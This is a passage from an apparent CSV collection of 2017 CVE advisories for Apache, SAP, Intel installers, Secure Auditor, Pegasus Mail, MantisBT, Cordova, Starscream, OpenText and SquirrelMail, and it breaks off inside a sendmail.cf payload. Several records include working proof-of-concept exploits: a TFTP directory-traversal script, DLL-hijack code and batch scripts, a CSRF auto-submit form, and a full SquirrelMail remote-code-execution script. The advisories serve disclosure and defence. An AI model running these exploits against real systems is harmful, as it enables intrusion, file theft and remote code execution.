available in 2.2.33 and 2.4.26, instead of ap_get_basic_auth_pw().
Modules which call the legacy ap_get_basic_auth_pw() during the
authentication phase MUST either immediately authenticate the user after
the call, or else stop the request immediately with an error response,
to avoid incorrectly authenticating the current request.
Credit:
The Apache HTTP Server security team would like to thank Emmanuel
Dreyfus for reporting this issue.
References:
https://httpd.apache.org/security_report.html"
1770,CVE-2017-7659: mod_http2 null pointer dereference,,CVE-2017-7659,"CVE-2017-7659: mod_http2 null pointer dereference
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
httpd 2.4.24 (unreleased)
httpd 2.4.25
Description:
A maliciously constructed HTTP/2 request could cause mod_http2 to
dereference a NULL pointer and crash the server process.
Mitigation:
2.4.25 users of mod_http2 should upgrade to 2.4.26.
Credit:
The Apache HTTP Server security team would like to thank Robert Święcki
for reporting this issue.
References:
https://httpd.apache.org/security_report.html"
1778,CVE-2017-9613: Stored Cross-Site Scripting in SAP successfactors,,CVE-2017-9613,"CVE-2017-9613: Stored Cross-Site Scripting in SAP successfactors
Severity: High
Vendor: SAP
Versions Affected: SAP successfactors - Release build b1702p5e.1190658
Description: Stored Cross-site scripting (XSS) vulnerability in SAP Successfactors allows remote authenticated users to inject arbitrary web script or HTML via the file upload functionality.
Resolution: SAP has fixed this in Release build b1705.1234962"
1808,[CVE-2017-5688] Executable installers are vulnerable^WEVIL (case 52): Intel installation framework allows arbitrary code execution with escalation of privilege,,CVE-2017-5688,"Hi @ll,
executable installers built with Intels Installation Framework,
for example ""Intel SSD Toolbox - v3.4.3.exe"", available from
<https://downloadcenter.intel.com/download/26574>, expose two
vulnerabilities, both resulting in arbitrary code execution
with escalation of privilege.
Vulnerability #1:
~~~~~~~~~~~~~~~~~
On a fully patched Windows 7 SP1 they load and execute (at least)
Cabinet.dll, Version.dll, RichEd20.dll, UXTheme.dll or DMWAPI.dll
(on other versions of Windows different DLLs may be affected)
from the directory they are stored (their so-called ""application
directory"") instead Windows' ""system directory""
%SystemRoot%System32"", resulting in arbitrary code execution.
DLL hijacking is a 20 year old, well-known and well-documented
vulnerability, and a typical (but ubiquituous) beginner's error:
see <https://cwe.mitre.org/data/definitions/426.html>,
<https://cwe.mitre.org/data/definitions/427.html>,
<https://capec.mitre.org/data/definitions/471.html>,
<https://technet.microsoft.com/en-us/library/2269637.aspx>,
<https://msdn.microsoft.com/en-us/library/ff919712.aspx> and
<https://msdn.microsoft.com/en-us/library/ms682586.aspx> plus
<https://skanthak.homepage.t-online.de/!execute.html> for more
documentation!
For software downloaded with a web browser the ""application
directory"" is typically the user's ""Downloads"" directory: see
<http://seclists.org/fulldisclosure/2015/Nov/101> and
<http://seclists.org/fulldisclosure/2015/Dec/86> plus
<https://insights.sei.cmu.edu/cert/2008/09/carpet-bombing-and-directory-poisoning.html>,
<http://blog.acrossecurity.com/2012/02/downloads-folder-binary-planting.html>,
<http://seclists.org/fulldisclosure/2012/Aug/134> and
<http://blogs.technet.com/b/srd/archive/2014/05/13/load-library-safely.aspx>
Due to the specification ""requireAdministrator"" in the application
manifest embedded within the executable, installers like
""Intel SSD Toolbox - v3.4.3.exe"" run with administrative privileges
(""protected"" administrators are prompted for consent, unprivileged
standard users are prompted for an administrator password),
resulting in an escalation of privilege!
If (one of) the DLLs named above get(s) planted in the users
""Downloads"" directory, for example per ""drive-by download"", this
vulnerability becomes a remote code execution WITH escalation of
privilege.
Proof of concept/demonstration:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
1. visit <https://skanthak.homepage.t-online.de/sentinel.html>,
download
<https://skanthak.homepage.t-online.de/skanthak/download/SENTINEL.DLL>
and save it as Cabinet.dll in your ""Downloads"" directory, then
copy it as Version.dll, RichEd20.dll, UXTheme.dll and DWMAPI.dll;
2. visit <https://downloadcenter.intel.com/download/26574>, download
<https://downloadmirror.intel.com/26574/eng/Intel%20SSD%20Toolbox%20-%20v3.4.3.exe>
and save it in your ""Downloads"" directory;
3. execute ""Intel SSD Toolbox - v3.4.3.exe"" from your ""Downloads""
directory;
4. notice the message boxes displayed from the DLLs placed in
step 1: PWNED!
Mitigation & detection:
~~~~~~~~~~~~~~~~~~~~~~~
* NEVER run executable installers from your ""Downloads"" directory;
* dump/avoid executable installers, use *.MSI instead!
* see <https://skanthak.homepage.t-online.de/!execute.html> plus
<http://blogs.technet.com/b/srd/archive/2014/05/13/load-library-safely.aspx>
* also see <https://skanthak.homepage.t-online.de/verifier.html>
Vulnerability #2:
~~~~~~~~~~~~~~~~~
On EVERY version of Windows these installers create UNSAFE
(sub)directories ""%TEMP%IIF<abcd>.tmp"", ""%TEMP%IIF<abcd>.tmpLang""
and ""%TEMP%IIF<abcd>.tmpLang<ll>-<CC>"", extract some dozen
DLLs ""%TEMP%IIF<abcd>.tmpLang<ll>-<CC>setup.exe.dll"" and load
ALL of them with administrative privileges.
An unprivileged attacker^Wuser can replace these DLLs between their
creation and their use, again resulting in elevation of privilege.
See <https://cwe.mitre.org/data/definitions/377.html> and
<https://cwe.mitre.org/data/definitions/379.html> for this
well-known and well-documented vulnerability.
Proof of concept/demonstration:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
1. visit <https://skanthak.homepage.t-online.de/sentinel.html>,
then download
<https://skanthak.homepage.t-online.de/skanthak/download/SENTINEL.DLL>
and save it in an arbitrary directory;
2. save the following batch script in the same directory:
--- IIF.CMD ---
:WAIT
@If Not Exist ""%TEMP%IIF????.tmp"" Goto :WAIT
For /D %%! In (""%TEMP%IIF????.tmp"") Do Set IIFTMP=%%!
For /R ""%IIFTMP%"" %%! In (setup.exe.dll) Do Copy SENTINEL.DLL ""%%!""
Set IIFTMP=
--- EOF ---
3. start the batch script;
4. execute ""Intel SSD Toolbox - v3.4.3.exe"".
stay tuned
Stefan Kanthak
Timeline:
~~~~~~~~~
2017-03-06 vulnerability report sent to vendor
2017-03-06 automatic reply ""we received your report""
2017-03-06 reply from vendor:
""We will escalate this to the appropriate team and get
back to you in the next couple of days.""
2017-03-14 followup from vendor:
""Our technical team has confirmed the finding and an
update is being created.""
2017-03-15 question sent to vendor:
""Will all executable installers built with the
vulnerable IIF be fixed, or just the one I picked?""
2017-03-15 reply from vendor:
""We are getting an update from the product team this
week and will relay your concerns.""
2017-04-21 notication from vendor:
""due to an unrelated problem we are delaying release
until the week of May 22. I can provide you with a
build that has the DLL hijacking fixed if you'd like.""
2017-04-21 answer to vendor: ""yes, I'd like to test it!""
2017-05-04 reply from vendor:
""we produced an official build (not beta) toward the
May 22 release, and we are very interested for you to
put it through your 'minefield'""
2017-05-05 notication from vendor:
""fixed installer for the SSD toolbox available from
<https://downloadcenter.intel.com/product/80096/Intel-SSD-Toolbox>
and
<https://downloadcenter.intel.com/product/80095/SSD-Software>""
2017-05-11 resent question from 2017-03-15 to vendor:
""Will all executable installers built with the
vulnerable IIF be fixed, or just the one I picked?""
2017-05-30 vendor publishes advisory INTEL-SA-00074
<https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00074&languageid=en-fr>"
1828,CVE-2017-9024 Secure Auditor - v3.0 Directory Traversal,,CVE-2017-9024,"[+] Credits: John Page aka HYP3RLINX
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/SECURE-AUDITOR-v3.0-DIRECTORY-TRAVERSAL.txt
[+] ISR: ApparitionSec
Vendor:
====================
www.secure-bytes.com
Product:
=====================
Secure Auditor - v3.0
Secure Auditor suite is a unified digital risk management solution for conducting automated audits on Windows, Oracle and SQL databases
and Cisco devices.
Vulnerability Type:
===================
Directory Traversal
CVE Reference:
==============
CVE-2017-9024
Security Issue:
================
Secure Bytes Cisco Configuration Manager, as bundled in Secure Bytes Secure Cisco Auditor (SCA) 3.0, has a
Directory Traversal issue in its TFTP Server, allowing attackers to read arbitrary files via ../ sequences in a pathname.
Exploit/POC:
=============
import sys,socket
print 'Secure Auditor v3.0 / Cisco Config Manager'
print 'TFTP Directory Traversal Exploit'
print 'Read ../../../../Windows/system.ini POC'
print 'hyp3rlinx'
HOST = raw_input(""[IP]> "")
FILE = '../../../../Windows/system.ini'
PORT = 69
PAYLOAD = ""x00x01"" #TFTP Read
PAYLOAD += FILE+""x00"" #Read system.ini using directory traversal
PAYLOAD += ""netasciix00"" #TFTP Type
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(PAYLOAD, (HOST, PORT))
out = s.recv(1024)
s.close()
print ""Victim Data located on : %s "" %(HOST)
print out.strip()
Network Access:
===============
Remote
Severity:
=========
High
Disclosure Timeline:
==================================
Vendor Notification: May 10, 2017
No replies
May 20, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1829,"CVE-2017-9046 Pegasus ""winpm-32.exe"" v4.72 Mailto: Link Remote Code Execution",,CVE-2017-9046,"[+] Credits: John Page AKA hyp3rlinx
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/PEGASUS-MAILTO-LINK-REMOTE-CODE-EXECUTION.txt
[+] ISR: APPARITIONSEC
Vendor:
=============
www.pmail.com
Product:
===========================
Pegasus ""winpm-32.exe""
v4.72 build 572
Pegasus Mail: Pegasus Mail is a free, standards-based electronic mail client suitable for use by single or multiple users on single
computers or on local area networks. A proven product, it has served millions of users since it was released in 1990.
Vulnerability Type:
======================
Remote Code Execution
CVE Reference:
==============
CVE-2017-9046
Security Issue:
================
Pegasus Mail has a DLL Load Flaw that allows arbitrary code execution by clicking an HTML ""mailto:"" link
if a DLL named ""ssgp.dll"" exists on the victims Desktop. Tested successfully using Internet Explorer Web Browser.
e.g.
<a href=""mailto:name victim com"">Link text</a>
Place ""ssgp.dll"" on the desktop then visit the webpage in ""Internet Explorer"", click the mailto: link arbitrary code executed
and Pegasus (pmail) is then launched.
User needs to have setup PMAIL with ""mailto:"" link option on install.
Exploit:
========
1) Set Pegasus as default Email client for opening Emails, and setup PMAIL with ""mailto:"" link option on install.
2) Compile ""ssgp.dll"" as DLL using below 'C' code.
#include<windows.h>
//gcc -c ssgp.c
//gcc -shared -o ssgp.dll ssgp.o
BOOL APIENTRY DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved){
switch (reason) {
case DLL_PROCESS_ATTACH:
MessageBox(NULL, ""Code Execution!"", ""APPARITIONSEC"", MB_OK);
break;
}
return 0;
}
3) Place ""ssgp.dll"" on Desktop
4) Create an HTML file with following in the web server root directory.
<a href=""mailto:name victim com"">Pegasus Exploit POC</a>
5) Open webpage in InternetExplorer Web Browser and click malicious mailto: link.
Our code gets executed...
Network Access:
===============
Remote
Severity:
=========
High
Disclosure Timeline:
=====================================
Vendor Notification: October 8, 2016
Vendor supposedly fixed: January 21, 2016
May 19, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1830,CVE-2017-9046 Mantis Bug Tracker 1.3.10 / v2.3.0 CSRF Permalink Injection,,CVE-2017-9046,"[+] Credits: John Page a.k.a hyp3rlinx
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/MANTIS-BUG-TRACKER-CSRF-PERMALINK-INJECTION.txt
[+] ISR: ApparitionSec
Vendor:
================
www.mantisbt.org
Product:
=========
Mantis Bug Tracker
1.3.10 / v2.3.0
MantisBT is a popular free web-based bug tracking system. It is written in PHP works with MySQL, MS SQL, and PostgreSQL databases.
Vulnerability Type:
========================
CSRF Permalink Injection
CVE Reference:
==============
CVE-2017-7620
Security Issue:
================
Remote attackers can inject arbitrary permalinks into the mantisbt Web Interface if an authenticated user visits a malicious webpage.
Vuln code in ""string_api.php"" PHP file, under mantis/core/ did not account for supplied backslashes.
Line: 270
# Check for URL's pointing to other domains
if( 0 == $t_type || empty( $t_matches['script'] ) ||

3 == $t_type && preg_match( '@(?:[^:]*)?:/*@', $t_url ) > 0 ) {
return ( $p_return_absolute ? $t_path . '/' : '' ) . 'index.php';
}
# Start extracting regex matches
$t_script = $t_matches['script'];
$t_script_path = $t_matches['path'];
Exploit/POC:
=============
<form action=""http://VICTIM-IP/mantisbt-2.3.0/permalink_page.php?url=/ATTACKER-IP"" method=""POST"">
<script>document.forms[0].submit()</script>
</form>
OR
<form action=""http://VICTIM-IP/permalink_page.php?url=/ATTACKER-IP%2Fmantisbt-2.3.0%2Fsearch.php%3Fproject_id%3D1%26sticky%3Don%26sort%3Dlast_updated%26dir%3DDESC%26hide_status%3D90%26match_type%3D0"" method=""POST"">
<script>document.forms[0].submit()</script>
</form>
Network Access:
===============
Remote
Severity:
=========
Medium
Disclosure Timeline:
=============================
Vendor Notification: April 9, 2017
Vendor Release Fix: May 15, 2017
Vendor Disclosed: May 20, 2017
May 20, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1832,[SECURITY] CVE-2017-5657: Apache Archiva CSRF vulnerability for REST endpoints,,CVE-2017-5657,"CVE-2017-5657: Apache Archiva CSRF vulnerabilities for various REST endpoints
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Archiva 2.0.0 - 2.2.1
The unsupported versions 1.x are also affected.
Several REST service endpoints of Apache Archiva are not protected against
Cross Site Request Forgery (CSRF) attacks. A malicious site opened in the same
browser as the archiva site, may send HTML response that performs arbitrary
actions on archiva services, with the same rights as the active archiva
session (e.g. adminstrator rights).
Mitigation:
All users are recommended to upgrade to Archiva 2.2.3 or higher,
where additional measures are taken to verify the origin of REST requests.
References:
http://archiva.apache.org/security.html#CVE-2017-5657
The newest Archiva version can be downloaded from:
http://archiva.apache.org/download.cgi"
1855,CVE-2016-6799: Internal system information leak,,CVE-2016-6799,"CVE-2016-6799: Internal system information leak
Severity: High
Vendor: The Apache Software Foundation
Versions Affected: Cordova Android (5.2.2 and below)
Description: The application calls methods of the Log class. Messages
passed to these methods (Log.v(), Log.d(), Log.i(), Log.w(), and
Log.e()) are stored in a series of circular buffers on the device. By
default, a maximum of four 16 KB rotated logs are kept in addition to
the current log. The logged data can be read using Logcat on the
device. When using platforms prior to Android 4.1 (Jelly Bean), the
log data is not sandboxed per application; any application installed
on the device has the capability to read data logged by other
applications.
Upgrade path: Developers who are concerned about this issue should
upgrade to 6.0.0 or later and install cordova plugins whose versions
are equal to or greater than:
cordova-plugin-battery-status: 1.2.0
cordova-plugin-camera: 2.3.0
cordova-plugin-console: 1.0.4
cordova-plugin-contacts: 2.2.0
cordova-plugin-device: 1.1.3
cordova-plugin-device-motion: 1.2.2
cordova-plugin-device-orientation: 1.0.4
cordova-plugin-dialogs: 1.3.0
cordova-plugin-file: 4.3.0
cordova-plugin-file-transfer: 1.6.0
cordova-plugin-geolocation: 2.3.0
cordova-plugin-globalization: 1.0.4
cordova-plugin-inappbrowser: 1.5.0
cordova-plugin-media: 2.4.0
cordova-plugin-media-capture: 1.4.0
cordova-plugin-network-information: 1.3.0
cordova-plugin-splashscreen: 4.0.0
cordova-plugin-statusbar: 2.2.0
cordova-plugin-test-framework: 1.1.3
cordova-plugin-vibration: 2.1.2
cordova-plugin-whitelist: 1.3.0
cordova-plugin-wkwebview-engine: 1.1.0
Mitigation Steps: If developers are unable to install the latest versions,
this vulnerability can easily be mitigated by not putting sensitive
information in the log statements.
Credit: Mark Ward"
1892,CVE-2017-7221. OpenText Documentum Content Server: arbitrary code execution in dm_bp_transition.ebs docbase method,,CVE-2017-7221,"CVE Identifier: CVE-2017-7221
Vendor: OpenText
Affected products: OpenText Documentum Content Server (all versions)
Researcher: Andrey B. Panfilov
Severity Rating: CVSS v3 Base Score: 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
Fix: not available
PoC: https://gist.github.com/andreybpanfilov/0a4fdfad561e59317a720e702b0fec44
Description:
Initially this vulnerability was discovered in 2013 and was tracked by CERT/CC as VRF#HUFPRMOP (https://www.kb.cert.org/vuls/id/315340), vendor had undertaken a couple of attempts to remediate security flaw (see CVE-2015-4533, CVE-2014-2513 and http://seclists.org/bugtraq/2015/Jul/51 for complete description), but all of them were wrong. The issue still persists in all versions of Documentum Content Server.
__
Regards,
Andrey B. Panfilov"
1897,CVE-2017-7192: Starscream library before 2.0.4 allows SSL pinning bypass,,CVE-2017-7192,"Product: Starscream websocket library
Severity: LOW
CVE Reference: CVE-2017-7192
Type: SSL Pinning bypass / Information disclosure
Abstract
--------
WebSocket.swift in Starscream before 2.0.4 allows an SSL Pinning
bypass because of incorrect management of the certValidated variable
(it can be set to true but cannot be set to false).
Description
-----------
The open-source Starscream library provides a SWIFT implementation of
the websocket framework. It allows iOS applications to send and
receive messages via a dedicated websocket channel.
Applications using the Starscream library (up to and including version
2.0.3) were vulnerable to potential SSL pinning bypass. If an attacker
in a man-in-the-middle position is able to reset an established TCP
connection between the client and server, the subsequent re-connection
will not pin the SSL certificate, allowing traffic interception.
Impact
------
An attacker can achieve traffic interception from a man-in-the-middle
position, first by resetting the TCP connection between the client and
server, and afterwards by injecting an SSL server certificates they
control.
Cause
-----
The code of the library contains a vulnerability whereby the state of
the connection (isValidated) is not properly updated after a
re-connection.
That creates a situation whereby pinning works properly only for the
initial connection.
Solution
--------
Upgrade to version 2.0.4.
Technical details
-----------------
The cause of the problem was incorrect management of the certValidated
variable. The variable starts out with a default value of false after
the class is instantiated, and can be set to true if an HTTP/WS schema
is used OR if the check against the pinned certificates succeeds. The
problem was that the variable was never set to false after a
disconnection if a HTTPS/WS schema is used.
The fix consisted of resetting the variable to false when a connection
is initiated and a secure schema is used.
Credits
-------
Vulnerability was discovered by Lukas Futera and Giuliano Galea of
Centralway Numbrs AG.
Disclosure timeline
-------------------
28.2.2017 Vulnerability reported to vendor
07.3.2017 Vulnerability acknowledgment by vendor
14.3.2017 Vendor published initial patch
28.3.2017 New version released
21.4.2017 Advisory published
--
This message is for the attention of the intended recipient(s) only. It may
contain confidential, proprietary and/or legally privileged information.
Use, disclosure and/or retransmission of information contained in this
email may be prohibited. If you are not an intended recipient, you are
kindly asked to notify the sender immediately (by reply e-mail) and to
permanently delete this message. Thank you."
1902,CVE-2017-7220. OpenText Documentum Content Server: privilege evaluation using crafted RPC save-commands.,,CVE-2017-7220,"CVE Identifier: CVE-2017-7220
Vendor: OpenText
Affected products: OpenText Documentum Content Server (all versions)
Researcher: Andrey B. Panfilov
Severity Rating: CVSS v3 Base Score: 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
Fix: not available
PoC:
https://gist.github.com/andreybpanfilov/d8792484e13971982c0719ae59ab8c7c
https://gist.github.com/andreybpanfilov/e0e60ae9d525a34cca04eb4c89a21e04
Description:
Initially this vulnerability was discovered in 2013 and was tracked by CERT/CC as VRF#HUFG9EBA (https://www.kb.cert.org/vuls/id/315340), vendor had undertaken a couple of attempts to remediate security flaw (see CVE-2014-2514 and http://seclists.org/bugtraq/2015/Aug/111 for complete description), but all of them was wrong. The issue still persists in all versions of Documentum Content Server.
__
Regards,
Andrey B. Panfilov"
1903,CVE-2017-7692: Squirrelmail 1.4.22 Remote Code Execution,,CVE-2017-7692,"Advisory ID: SGMA17-001
Title: Squirrelmail Remote Code Execution
Product: Squirrelmail
Version: 1.4.22 and probably prior
Vendor: squirrelmail.org
Type: Command Injection
Risk level: 4 / 5
Credit: filippo.cavallarin wearesegment com
CVE: CVE-2017-7692
Vendor notification: 2017-04-04
Vendor fix: N/A
Public disclosure: 2017-04-19
DETAILS
Squirrelmail version 1.4.22 (and probably prior) is vulnerable to a remote code execution vulnerability because
it fails to sanitize a string before passing it to a popen call. It's possible to exploit this vulnerability to
execute arbitrary shell commands on the remote server.
The problem is in Deliver_SendMail.class.php on initStream function that uses escapeshellcmd() to sanitize the
sendmail command before executing it. The use of escapeshellcmd() is not correct in this case since it don't
escapes whitespaces allowing the injection of arbitrary command parameters.
$this->sendmail_command = ""$sendmail_path $this->sendmail_args -f$envelopefrom"";
$stream = popen(escapeshellcmd($this->sendmail_command), ""w"");
The $envelopefrom variable is controlled by the attacker, hence it's possible to trick sendmail to use an
attacker-provided configuration file that triggers the execution of an arbitrary command.
In order to exploit this vulnerability the MTA in use must be sendmail and Squirrelmail must be configured
to use it as commandline (useSendmail directive of the config file set to true).
Also, the edit_identity directive of the config file must be bet to true, but this is the default configuration.
To reproduce the issue follow these steps:
1. Create a rogue sendmail.cf that triggers the execution of a /usr/bin/touch:
[...]
Mlocal, P=/usr/bin/touch, F=lsDFMAw5:/|@qPn9S, S=EnvFromL/HdrFromL, R=EnvToL/HdrToL,
T=DNS/RFC822/X-Unix,
A=X /tmp/executed
2. Upload it as a mail attachment and get it's remote name (ex: lF51mGPJwdqzV3LEDlCdSVNpohzgF7sD)
3. Go to Options -> Personal Informations and set the following payload as Email Address:
<aaa abc com -OQueueDirectory=/tmp -C /var/local/squirrelmail/attach/lF51mGPJwdqzV3LEDlCdSVNpohzgF7sD>
4. Send an email
5. Verify the execution of the command with ""ls /tmp/executed"" on the remote server
PROOF OF CONCEPT
The followig python script exploits this vulnerability to execute an attacker provided bash script on the remote server.
BOF
#!/usr/bin/env python
# -*- coding: utf-8 -*-
""""""
SquirrelMail 1.4.22 Remote Code Execution (authenticated)
Exploit code for CVE-2017-7692
filippo.cavallarin wearesegment com
""""""
from __future__ import unicode_literals
import sys
import os
import re
import requests
reload(sys)
sys.setdefaultencoding('utf8')
SENDMAILCF=""/tmp/squirrelmail1_4_22-sendmailcf-rce""
COMPOSE = ""/src/compose.php""
INFOS = ""/src/options.php?optpage=personal""
SQM_ATTACH_PATH = ""/var/local/squirrelmail/attach/""
# must be enclosed in <> otherwise spaces will be removed ..
SENDER = ""<px xxxx com -OQueueDirectory=/tmp -C %s%s>""
SESSID = """"
BASEURL = """"
def attach(attachment):
url = ""%s%s"" % (BASEURL, COMPOSE)
token = get_csrf_token(url)
values = {
""smtoken"": token,
""attach"": ""add""
}
try:
files = {'attachfile': open(attachment,'rb')}
resp = requests.post(url, files=files, data=values, cookies={'SQMSESSID':SESSID})
fname = re.search(r'att_local_name&quot;;s:[0-9]+:&quot;([a-zA-Z0-9]+)&quot;', resp.text)
if not fname:
print "" Error: unable to upload file %s"" % attachment
return fname.group(1)
except Exception as e:
print "" Error: %s"" % e
sys.exit(1)
def send():
url = ""%s%s"" % (BASEURL, COMPOSE)
token = get_csrf_token(url)
values = {
""smtoken"": token,
""send_to"": ""root"",
""send"": ""Send""
}
try:
resp = requests.post(url, data=values, cookies={'SQMSESSID':SESSID})
except Exception as e:
print "" Error: %s"" % e
sys.exit(1)
def set_identity(sender):
url = ""%s%s"" % (BASEURL, INFOS)
token = get_csrf_token(url)
values = {
""smtoken"": token,
""optpage"": ""personal"",
""optmode"": ""submit"",
""new_email_address"": sender,
""submit_personal"": ""Submit""
}
try:
requests.post(url, data=values, cookies={'SQMSESSID':SESSID})
except Exception as e:
print "" Error: %s"" % e
sys.exit(1)
def get_csrf_token(url):
try:
body = requests.get(url, cookies={'SQMSESSID':SESSID}).text
inp = re.search(r'<input.*name=""smtoken"".*>', body, re.MULTILINE)
token = re.search(r'value=""([a-zA-Z0-9]+)""', inp.group(0))
if token:
return token.group(1)
except Exception as e:
pass
print "" Unable to get CSRF token""
sys.exit(1)
def outw(s):
sys.stdout.write(s)
sys.stdout.flush()
def main(argv):
global BASEURL
global SESSID
if len(argv) != 4:
print (
""SquirrelMail 1.4.22 Remote Code Execution (authenticated) - filippo.cavallarin wearesegment com ""
""The target server must use sendmail and squirrelmail must be configured to use /usr/bin/sendmail ""
""Usage: ""
"" %s <url> <session_id> <script> ""
"" url: the url of squirrelmail ""
"" session_id: the value of SQMSESSID cookie ""
"" script: the path to the bash script to be executed on the target ""
""Example: ""
"" %s http:/example.com/squirrelmail/ l2rapvcovsui1on0b4i5boev24 reverseshell.sh""
) % (argv[0], argv[0])
sys.exit(1)
BASEURL = argv[1]
SESSID = argv[2]
script = argv[3]
outw(""Uploading script ... "")
script_fname = attach(script)
print ""ok""
outw(""Generating sendmail.cf ... "")
try:
script_path = ""%s%s"" % (SQM_ATTACH_PATH, script_fname)
with open(SENDMAILCF, 'w') as f:
f.write(SENDMAILCF_CONTENT % script_path)
except Exception as e:
print "" Error: %s"" % e
sys.exit(1)
print ""ok""
outw(""Uploading sendmail.cf ... "")
smc_fname = attach(SENDMAILCF)
os.remove(SENDMAILCF)
print ""ok""
outw(""Updating user options ... "")
sender = SENDER % (SQM_ATTACH_PATH, smc_fname)
set_identity(sender)
print ""ok""
outw(""Checking identity field ... "")
icheck = requests.get(""%s%s"" % (BASEURL, INFOS), cookies={'SQMSESSID':SESSID}).text
if not smc_fname in icheck:
print "" Error: unable to set identity field .. maybe squirrelmail is configured with edit_identity=false""
sys.exit(1)
print ""ok""
outw(""Executing script ... "")
send()
print ""ok ""
sys.exit(0)
SENDMAILCF_CONTENT = """"""
O DontBlameSendmail=,AssumeSafeChown,ForwardFileInGroupWritableDirPath,GroupWritableForwardFileSafe,GroupWritableIncludeFileSafe,IncludeFileInGroupWritableDirPath,DontWarnForwardFileInUnsafeDirPath,TrustStickyBit,NonRootSafeAddr,GroupWritableIncludeFile,GroupReadableDefaultAuthInfoFile
Kdequote dequote
Scanonify=3
R$@ $@ <@>
R$* $: $1 <@> mark addresses
R$* < $* > $* <@> $: $1 < $2 > $3 unmark <addr>
R@ $* <@> $: @ $1 unmark @host:...
R$* [ IPv6 : $+ ] <@> $: $1 [ IPv6 : $2 ] unmark IPv6 addr
R$* :: $* <@> $: $1 :: $2 unmark node::addr
R:include: $* <@> $: :include: $1 unmark :include:...
R$* : $* [ $* ] $: $1 : $2 [ $3 ] <@> remark if leading colon
R$* : $* <@> $: $2 strip colon if marked
R$* <@> $: $1 unmark
R$* ; $1 strip trailing semi
R$* < $+ :; > $* $@ $2 :; <@> catch <list:;>
R$* < $* ; > $1 < $2 > bogus bracketed semi
R$@ $@ :; <@>
R$* $: < $1 > housekeeping <>
R$+ < $* > < $2 > strip excess on left
R< $* > $+ < $1 > strip excess on right
R<> $@ < @ > MAIL FROM:<> case
R< $+ > $: $1 remove housekeeping <>
R@ $+ , $+ $2
R@ [ $* ] : $+ $2
R@ $+ : $+ $2
R $+ : $* ; @ $+ $@ $>Canonify2 $1 : $2 ; < @ $3 > list syntax
R $+ : $* ; $@ $1 : $2; list syntax
R$+ @ $+ $: $1 < @ $2 > focus on domain
R$+ < $+ @ $+ > $1 $2 < @ $3 > move gaze right
R$+ < @ $+ > $@ $>Canonify2 $1 < @ $2 > already canonical
R$- ! $+ $@ $>Canonify2 $2 < @ $1 .UUCP > resolve uucp names
R$+ . $- ! $+ $@ $>Canonify2 $3 < @ $1 . $2 > domain uucps
R$+ ! $+ $@ $>Canonify2 $2 < @ $1 .UUCP > uucp subdomains
R$* %% $* $1 @ $2 First make them all @s.
R$* @ $* @ $* $1 %% $2 @ $3 Undo all but the last.
R$* @ $* $@ $>Canonify2 $1 < @ $2 > Insert < > and finish
R$* $@ $>Canonify2 $1
SCanonify2=96
R$* < @ localhost > $* $: $1 < @ $j . > $2 no domain at all
R$* < @ localhost . $m > $* $: $1 < @ $j . > $2 local domain
R$* < @ localhost . UUCP > $* $: $1 < @ $j . > $2 .UUCP domain
R$* < @ [ $+ ] > $* $: $1 < @@ [ $2 ] > $3 mark [addr]
R$* < @@ $=w > $* $: $1 < @ $j . > $3 self-literal
R$* < @@ $+ > $* $@ $1 < @ $2 > $3 canon IP addr
Sfinal=4
R$+ :; <@> $@ $1 : handle <list:;>
R$* <@> $@ handle <> and list:;
R$* < @ $+ . > $* $1 < @ $2 > $3
R$* < @ *LOCAL* > $* $1 < @ $j > $2
R$* < $+ > $* $1 $2 $3 defocus
R@ $+ : @ $+ : $+ @ $1 , @ $2 : $3 <route-addr> canonical
R@ $* $@ @ $1 ... and exit
R$+ @ $- . UUCP $2!$1 u h UUCP => h!u
R$+ %% $=w @ $=w $1 @ $2 u%%host@host => u@host
SRecurse=97
R$* $: $>canonify $1
R$* $@ $>parse $1
Sparse=0
R$* $: $>Parse0 $1 initial parsing
R<@> $#local $: <@> special case error msgs
R$* $: $>ParseLocal $1 handle local hacks
R$* $: $>Parse1 $1 final parsing
SParse0
R<@> $@ <@> special case error msgs
R$* : $* ; <@> $#error $@ 5.1.3 $: ""553 List:; syntax illegal for recipient addresses""
R@ <@ $* > < @ $1 > catch ""@@host"" bogosity
R<@ $+> $#error $@ 5.1.3 $: ""553 User address required""
R$+ <@> $#error $@ 5.1.3 $: ""553 Hostname required""
R$* $: <> $1
R<> $* < @ [ $* ] : $+ > $* $1 < @ [ $2 ] : $3 > $4
